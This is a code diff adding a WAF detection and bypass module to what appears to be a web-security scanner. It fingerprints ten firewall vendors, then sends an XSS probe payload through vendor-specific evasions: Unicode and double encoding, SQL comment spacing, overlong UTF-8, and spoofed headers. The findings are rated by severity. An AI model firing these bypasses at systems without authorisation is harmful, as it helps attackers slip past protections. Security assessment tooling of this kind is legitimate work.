@@ -2366,3 +2366,685 @@ class HTTP2MultiplexingEvasion:
             "http2_used": any(r.get("http_version") == "HTTP/2" for r in results),
             "results": results,
         }
+
+
+# ===========================================================================
+# WAF FINGERPRINTING + BYPASS SCANNER — Faz D (WAF Bypass Engine)
+# Classes: WAFFingerprint, WAFBypassLibrary, AdaptiveWAFBypass, WAFBypassScanner
+# ===========================================================================
+
+class WAFFingerprint:
+    """
+    Lightweight WAF vendor detector for scanner use.
+    Inspects HTTP response headers, cookies, and body to identify the WAF vendor.
+
+    SOLID/SRP: Only responsible for WAF vendor identification from a response object.
+    """
+
+    SIGNATURES: Dict[str, Dict] = {
+        "cloudflare": {
+            "headers": ["CF-Ray", "CF-Cache-Status", "cf-request-id"],
+            "cookies": ["__cfduid", "cf_clearance", "__cf_bm"],
+            "body_patterns": [
+                "Cloudflare Ray ID",
+                "cloudflare.com",
+                "DDoS protection by Cloudflare",
+                "Attention Required! | Cloudflare",
+            ],
+        },
+        "sucuri": {
+            "headers": ["X-Sucuri-ID", "X-Sucuri-Cache"],
+            "cookies": ["sucuri_cloudproxy_uuid"],
+            "body_patterns": [
+                "Sucuri WebSite Firewall",
+                "Access Denied - Sucuri",
+            ],
+        },
+        "imperva": {
+            "headers": ["X-Powered-By-Imperva", "X-Iinfo", "X-Cdn"],
+            "cookies": ["visid_incap_", "incap_ses_", "visid_incap", "incap_ses"],
+            "body_patterns": [
+                "Incapsula incident ID",
+                "Request unsuccessful. Incapsula",
+                "_Incapsula_Resource",
+            ],
+        },
+        "aws_waf": {
+            "headers": ["X-AMZ-CF-ID", "X-Cache", "X-Amzn-Requestid"],
+            "cookies": ["aws-waf-token", "AWSALB"],
+            "body_patterns": ["AWS WAF", "Request blocked"],
+        },
+        "akamai": {
+            "headers": [],
+            "server_patterns": ["AkamaiGHost", "Akamai"],
+            "cookies": ["ak_bmsc", "bm_sz"],
+            "body_patterns": [
+                "Access Denied",
+                "Reference #",
+                r"Reference #\d+\.\w+\.\d+",
+            ],
+        },
+        "modsecurity": {
+            "headers": ["X-Mod-Security-Violations", "Mod-Security"],
+            "cookies": [],
+            "body_patterns": [
+                "ModSecurity",
+                "mod_security",
+                "NAXSI_FMT",
+                "406 Not Acceptable",
+                "Not Acceptable!",
+            ],
+        },
+        "f5_bigip": {
+            "headers": ["X-WA-Info"],
+            "cookies": ["TS01", "BIGipServer"],
+            "body_patterns": [
+                "The requested URL was rejected",
+                "Please consult with your administrator",
+                "F5 Networks",
+            ],
+        },
+        "azure_waf": {
+            "headers": ["X-Azure-Ref", "X-Ms-Request-Id"],
+            "cookies": [],
+            "body_patterns": [
+                "The request is blocked",
+                "Azure Web Application Firewall",
+                "RequestId:",
+            ],
+        },
+        "fortiweb": {
+            "headers": ["X-Fw-Errcode"],
+            "cookies": ["FORTITOKEN"],
+            "body_patterns": [
+                "FortiWeb",
+                "This request is blocked by the Web Application Firewall",
+            ],
+        },
+        "barracuda": {
+            "headers": [],
+            "cookies": ["barra_counter_session"],
+            "body_patterns": [
+                "Barracuda Web Application Firewall",
+                "bwf_bl",
+            ],
+        },
+    }
+
+    def detect(self, response) -> str:
+        """
+        Inspect a requests.Response object and return the WAF vendor name.
+        Returns 'unknown' if no signature matches.
+        """
+        try:
+            resp_headers = {k.lower(): v for k, v in (response.headers or {}).items()}
+            resp_cookies = {k.lower(): v for k, v in (response.cookies or {}).items()}
+            resp_body = ""
+            try:
+                resp_body = response.text[:8192]
+            except Exception:
+                pass
+
+            best_vendor = "unknown"
+            best_score = 0
+
+            for vendor, sig in self.SIGNATURES.items():
+                score = 0
+
+                # Check response headers
+                for hdr in sig.get("headers", []):
+                    if hdr.lower() in resp_headers:
+                        score += 2
+
+                # Check server header against server_patterns
+                server_val = resp_headers.get("server", "")
+                for sp in sig.get("server_patterns", []):
+                    if sp.lower() in server_val.lower():
+                        score += 2
+
+                # Check cookies
+                for ck_prefix in sig.get("cookies", []):
+                    for ck_name in resp_cookies:
+                        if ck_name.startswith(ck_prefix.lower()):
+                            score += 2
+                            break
+
+                # Check body patterns
+                for pattern in sig.get("body_patterns", []):
+                    if pattern.lower() in resp_body.lower():
+                        score += 3
+
+                if score > best_score:
+                    best_score = score
+                    best_vendor = vendor
+
+            return best_vendor if best_score >= 2 else "unknown"
+
+        except Exception as exc:
+            _logger.debug(f"[WAFFingerprint] Detection error: {exc!r}")
+            return "unknown"
+
+
+class WAFBypassLibrary:
+    """
+    Per-WAF bypass mutation library.
+    Returns a list of bypass descriptor dicts for a given WAF vendor.
+
+    SOLID/OCP: New WAF bypass sets can be added to BYPASS_SETS without
+    modifying the retrieval logic.
+    """
+
+    BYPASS_SETS: Dict[str, List[Dict[str, Any]]] = {
+        "cloudflare": [
+            # Unicode normalization bypass: replace angle brackets with fullwidth equivalents
+            {
+                "type": "unicode",
+                "transform": lambda p: p.replace("<", "＜").replace(">", "＞"),
+            },
+            # Chunked Transfer-Encoding header hint (adapter applies actual chunking)
+            {
+                "type": "header",
+                "header": "Transfer-Encoding",
+                "value": "chunked",
+            },
+            # Case mutation: alternate upper/lower per character
+            {
+                "type": "case",
+                "transform": lambda p: "".join(
+                    c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)
+                ),
+            },
+            # Referrer spoofing
+            {
+                "type": "header",
+                "header": "Referer",
+                "value": "https://www.google.com/",
+            },
+        ],
+        "aws_waf": [
+            # Double URL encode angle brackets: < -> %253C
+            {
+                "type": "encode",
+                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E")
+                    .replace("'", "%2527").replace('"', "%2522"),
+            },
+            # Uppercase all alpha chars
+            {
+                "type": "case",
+                "transform": lambda p: p.upper(),
+            },
+            # HPP (split first half)
+            {
+                "type": "hpp",
+                "transform": lambda p: p[: max(1, len(p) // 2)],
+            },
+        ],
+        "imperva": [
+            # SQL comment injection between spaces
+            {
+                "type": "comment",
+                "transform": lambda p: p.replace(" ", "/**/"),
+            },
+            # Tab instead of space
+            {
+                "type": "whitespace",
+                "transform": lambda p: p.replace(" ", "\t"),
+            },
+            # Newline injection
+            {
+                "type": "newline",
+                "transform": lambda p: p.replace(" ", "\n"),
+            },
+        ],
+        "modsecurity": [
+            # Multipart Content-Type hint (header only)
+            {
+                "type": "header",
+                "header": "Content-Type",
+                "value": "multipart/form-data; boundary=--xyz1234",
+            },
+            # CDATA wrap for XML contexts
+            {
+                "type": "cdata",
+                "transform": lambda p: f"<![CDATA[{p}]]>",
+            },
+            # Overlong UTF-8 percent-encoding of angle brackets
+            {
+                "type": "overlong",
+                "transform": lambda p: p.replace("<", "%C0%BC").replace(">", "%C0%BE"),
+            },
+        ],
+        "akamai": [
+            # Case randomization
+            {
+                "type": "case",
+                "transform": lambda p: "".join(
+                    c.upper() if random.random() > 0.5 else c.lower() for c in p
+                ),
+            },
+            # Accept header abuse
+            {
+                "type": "header",
+                "header": "Accept",
+                "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            },
+        ],
+        "f5_bigip": [
+            # Path suffix to confuse normalizer
+            {
+                "type": "path_suffix",
+                "transform": lambda p: p,  # suffix applied at request level
+                "suffix": ";.css",
+            },
+            # Double encode
+            {
+                "type": "encode",
+                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E"),
+            },
+        ],
+        "sucuri": [
+            # Referrer + XFF spoofing (header-type)
+            {
+                "type": "header",
+                "header": "X-Forwarded-For",
+                "value": "127.0.0.1",
+            },
+            # Unicode chars
+            {
+                "type": "unicode",
+                "transform": lambda p: p.replace("<", "＜").replace(">", "＞"),
+            },
+        ],
+        "azure_waf": [
+            # JSON unicode escape of payload
+            {
+                "type": "json_escape",
+                "transform": lambda p: "".join(
+                    f"\\u{ord(c):04x}" if c in "<>\"'" else c for c in p
+                ),
+            },
+            # Double URL encode
+            {
+                "type": "encode",
+                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E"),
+            },
+        ],
+        "generic": [
+            # HPP split — send first half of payload
+            {
+                "type": "hpp",
+                "transform": lambda p: p[: max(1, len(p) // 2)],
+            },
+            # Accept header abuse
+            {
+                "type": "header",
+                "header": "Accept",
+                "value": "text/html,application/xhtml+xml,*/*",
+            },
+            # Case mutation
+            {
+                "type": "case",
+                "transform": lambda p: "".join(
+                    c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)
+                ),
+            },
+            # Comment injection
+            {
+                "type": "comment",
+                "transform": lambda p: p.replace(" ", "/**/"),
+            },
+            # Double encode
+            {
+                "type": "encode",
+                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E"),
+            },
+        ],
+    }
+
+    def get_bypasses(self, waf_name: str) -> List[Dict[str, Any]]:
+        """
+        Return bypass descriptor list for the given WAF vendor.
+        Falls back to 'generic' if the vendor is not in the library.
+        Always appends generic bypasses to the vendor-specific list.
+        """
+        specific = self.BYPASS_SETS.get(waf_name, [])
+        generic = self.BYPASS_SETS.get("generic", [])
+        # Merge: vendor-specific first, then generic ones not already present
+        specific_types = {b.get("type") for b in specific}
+        merged = list(specific)
+        for b in generic:
+            if b.get("type") not in specific_types:
+                merged.append(b)
+        return merged
+
+
+class AdaptiveWAFBypass:
+    """
+    Adaptive WAF bypass engine.
+    Iterates over WAF-specific bypass mutations and probes the target until
+    a non-blocking response is received.
+
+    SOLID/SRP: Only responsible for trying bypass mutations against a live target.
+    """
+
+    def __init__(self, session, waf_name: str):
+        """
+        session  : requests.Session (or WAFBypassSession) for HTTP requests
+        waf_name : detected WAF vendor string (e.g. 'cloudflare', 'unknown')
+        """
+        self.session = session
+        self.waf_name = waf_name
+        self._bypass_library = WAFBypassLibrary()
+
+    def try_bypass(
+        self,
+        url: str,
+        param: str,
+        payload: str,
+        timeout: int = 10,
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Try WAF-specific bypass mutations on the given URL + param + payload.
+
+        Returns the first successful bypass as::
+
+            {
+                "bypass_type": str,
+                "mutated_payload": str,
+                "response_code": int,
+                "waf": str,
+            }
+
+        Returns None if all bypass attempts are blocked (or error).
+        """
+        bypasses = self._bypass_library.get_bypasses(self.waf_name)
+
+        for bypass in bypasses:
+            b_type = bypass.get("type", "unknown")
+            transform = bypass.get("transform")
+
+            try:
+                # Header-only bypass: inject a special header, use original payload
+                if b_type == "header":
+                    extra_headers = {bypass["header"]: bypass["value"]}
+                    resp = self.session.get(
+                        url,
+                        params={param: payload},
+                        headers=extra_headers,
+                        timeout=timeout,
+                        allow_redirects=True,
+                    )
+                    mutated = payload  # payload unchanged for header-type bypasses
+                elif transform is not None:
+                    # Transform the payload and send
+                    mutated = transform(payload)
+                    resp = self.session.get(
+                        url,
+                        params={param: mutated},
+                        timeout=timeout,
+                        allow_redirects=True,
+                    )
+                else:
+                    # No transform and not a header bypass — skip
+                    continue
+
+                # A non-403/non-406 status indicates the WAF was bypassed
+                if resp.status_code not in (403, 406, 429):
+                    _logger.debug(
+                        f"[AdaptiveWAFBypass] Bypass SUCCESS: type={b_type} "
+                        f"status={resp.status_code} waf={self.waf_name}"
+                    )
+                    return {
+                        "bypass_type": b_type,
+                        "mutated_payload": mutated,
+                        "response_code": resp.status_code,
+                        "waf": self.waf_name,
+                    }
+
+            except Exception as exc:
+                _logger.debug(f"[AdaptiveWAFBypass] Bypass attempt ({b_type}) failed: {exc!r}")
+                continue
+
+        return None
+
+
+# ---------------------------------------------------------------------------
+# WAFBypassScanner — BaseScanner integration
+# ---------------------------------------------------------------------------
+
+class WAFBypassScanner:
+    """
+    Scanner that detects WAF presence and validates bypass feasibility.
+
+    Workflow:
+      1. Fingerprint the WAF via WAFFingerprint (header/cookie/body analysis).
+      2. Confirm the WAF blocks a known-malicious XSS payload (expects 403).
+      3. Attempt WAF bypass mutations via AdaptiveWAFBypass.
+      4. Report findings:
+           - Bypass succeeds          -> Critical
+           - WAF detected, no bypass  -> Medium
+           - No WAF detected          -> Informational
+
+    SOLID/SRP: Only responsible for WAF detection and bypass validation.
+    """
+
+    name = "waf_bypass"
+
+    # XSS probe payload — known to trigger most WAFs
+    _PROBE_PAYLOAD = "<script>alert(1)</script>"
+    _PROBE_PARAM = "q"
+
+    def __init__(self, session=None, results: Optional[Dict] = None, debug: bool = False):
+        try:
+            from websecure.scanners.base import BaseScanner
+            # Compose rather than inherit to avoid circular import risk
+            self._base = BaseScanner(session=session, results=results, debug=debug)
+        except Exception:
+            self._base = None
+
+        self.session = (self._base.session if self._base else None) or session
+        if self.session is None:
+            import requests as _req
+            self.session = _req.Session()
+            self.session.headers["User-Agent"] = get_random_user_agent()
+
+        self.results: Dict = (self._base.results if self._base else None) or (results if results is not None else {})
+        self.debug = debug
+        self.logger = logging.getLogger("websecure.scanners.waf_bypass")
+        if debug:
+            self.logger.setLevel(logging.DEBUG)
+
+    # ------------------------------------------------------------------
+    # Internal helpers
+    # ------------------------------------------------------------------
+
+    def _add(self, bucket: str, entry: Dict[str, Any]) -> None:
+        """Add finding via BaseScanner if available, else direct."""
+        import time as _time
+        entry.setdefault("timestamp", _time.time())
+        if self._base is not None:
+            try:
+                self._base.add(bucket, entry)
+                return
+            except Exception:
+                pass
+        with threading.Lock():
+            self.results.setdefault(bucket, []).append(entry)
+
+    # ------------------------------------------------------------------
+    # Main scan logic
+    # ------------------------------------------------------------------
+
+    def run(self, target: str, **kwargs) -> Dict[str, Any]:
+        """
+        Run WAF detection and bypass validation against target URL.
+
+        Returns results dict with 'waf_bypass' bucket populated.
+        """
+        findings: List[Dict] = []
+        self.logger.info(f"[WAFBypassScanner] Scanning: {target}")
+
+        # ---- Step 1: Probe baseline response to fingerprint WAF ----
+        waf_vendor = "unknown"
+        try:
+            baseline_resp = self.session.get(
+                target, timeout=10, allow_redirects=True
+            )
+            fingerprinter = WAFFingerprint()
+            waf_vendor = fingerprinter.detect(baseline_resp)
+            self.logger.debug(f"[WAFBypassScanner] WAF fingerprint: {waf_vendor}")
+        except Exception as exc:
+            self.logger.debug(f"[WAFBypassScanner] Baseline probe failed: {exc!r}")
+
+        # ---- Step 2: Also use WAFDetector for confidence-scored detection ----
+        waf_profile = None
+        try:
+            detector = WAFDetector(timeout=10)
+            waf_profile = detector.detect(target, session=self.session)
+            if waf_profile.detected and waf_vendor == "unknown":
+                waf_vendor = waf_profile.vendor
+        except Exception as exc:
+            self.logger.debug(f"[WAFBypassScanner] WAFDetector failed: {exc!r}")
+
+        # ---- Step 3: Confirm WAF blocks the XSS payload ----
+        waf_blocks_payload = False
+        if waf_vendor != "unknown" or (waf_profile and waf_profile.detected):
+            try:
+                probe_resp = self.session.get(
+                    target,
+                    params={self._PROBE_PARAM: self._PROBE_PAYLOAD},
+                    timeout=10,
+                    allow_redirects=True,
+                )
+                waf_blocks_payload = probe_resp.status_code in (403, 406, 429, 503)
+                self.logger.debug(
+                    f"[WAFBypassScanner] Probe status={probe_resp.status_code} "
+                    f"blocks_payload={waf_blocks_payload}"
+                )
+            except Exception as exc:
+                self.logger.debug(f"[WAFBypassScanner] Payload probe failed: {exc!r}")
+
+        # ---- Step 4: Attempt bypass if WAF is confirmed ----
+        if waf_vendor != "unknown" and waf_blocks_payload:
+            bypass_engine = AdaptiveWAFBypass(
+                session=self.session,
+                waf_name=waf_vendor,
+            )
+            bypass_result = bypass_engine.try_bypass(
+                url=target,
+                param=self._PROBE_PARAM,
+                payload=self._PROBE_PAYLOAD,
+                timeout=10,
+            )
+
+            if bypass_result:
+                # Bypass succeeded — Critical finding
+                finding = {
+                    "type": "WAF Bypass",
+                    "url": target,
+                    "severity": "Critical",
+                    "detail": (
+                        f"WAF ({waf_vendor}) was successfully bypassed using "
+                        f"'{bypass_result['bypass_type']}' mutation. "
+                        f"Payload reached server with HTTP {bypass_result['response_code']}."
+                    ),
+                    "evidence": {
+                        "waf_vendor": waf_vendor,
+                        "bypass_type": bypass_result["bypass_type"],
+                        "mutated_payload": bypass_result["mutated_payload"],
+                        "response_code": bypass_result["response_code"],
+                        "original_payload": self._PROBE_PAYLOAD,
+                    },
+                }
+                findings.append(finding)
+                self._add("waf_bypass", finding)
+                self.logger.warning(
+                    f"[WAFBypassScanner] CRITICAL: WAF bypass confirmed "
+                    f"({waf_vendor}, type={bypass_result['bypass_type']})"
+                )
+
+            else:
+                # WAF detected but not bypassed — Medium
+                finding = {
+                    "type": "WAF Detected",
+                    "url": target,
+                    "severity": "Medium",
+                    "detail": (
+                        f"WAF ({waf_vendor}) detected and successfully blocking payloads. "
+                        f"No bypass found with current mutation library."
+                    ),
+                    "evidence": {
+                        "waf_vendor": waf_vendor,
+                        "confidence": getattr(waf_profile, "confidence", None),
+                        "bypass_strategies_tried": len(
+                            WAFBypassLibrary().get_bypasses(waf_vendor)
+                        ),
+                    },
+                }
+                findings.append(finding)
+                self._add("waf_bypass", finding)
+                self.logger.info(
+                    f"[WAFBypassScanner] WAF detected ({waf_vendor}), no bypass found."
+                )
+
+        elif waf_vendor != "unknown" and not waf_blocks_payload:
+            # WAF present but not blocking this payload (misconfigured or benign)
+            finding = {
+                "type": "WAF Detected (Not Blocking)",
+                "url": target,
+                "severity": "Low",
+                "detail": (
+                    f"WAF ({waf_vendor}) detected but did not block the XSS probe payload. "
+                    f"WAF may be in monitoring-only mode or misconfigured."
+                ),
+                "evidence": {
+                    "waf_vendor": waf_vendor,
+                    "probe_payload": self._PROBE_PAYLOAD,
+                },
+            }
+            findings.append(finding)
+            self._add("waf_bypass", finding)
+
+        else:
+            # No WAF detected — Informational
+            finding = {
+                "type": "No WAF Detected",
+                "url": target,
+                "severity": "Informational",
+                "detail": (
+                    "No WAF signature detected. Target may be directly exposed "
+                    "without a Web Application Firewall."
+                ),
+                "evidence": {
+                    "waf_vendor": "none",
+                },
+            }
+            findings.append(finding)
+            self._add("waf_bypass", finding)
+            self.logger.info("[WAFBypassScanner] No WAF detected.")
+
+        self.results.setdefault("waf_bypass_summary", {"vulnerabilities": len(findings)})
+        return self.results
+
+
+# ---------------------------------------------------------------------------
+# Module-level run() — required for plugin_registry functional wrapper
+# ---------------------------------------------------------------------------
+
+def run(
+    url: str,
+    session=None,
+    results: Optional[Dict] = None,
+    debug: bool = False,
+    **kwargs,
+) -> Dict[str, Any]:
+    """
+    Module-level entry point for WAFBypassScanner.
+    Compatible with both direct calls and plugin_registry functional wrapper.
+    """
+    try:
+        scanner = WAFBypassScanner(session=session, results=results, debug=debug)
+        return scanner.run(url, **kwargs)
+    except Exception as exc:
+        _logger.error(f"[waf_bypass.run] Unhandled error: {exc!r}")
+        return results or {}
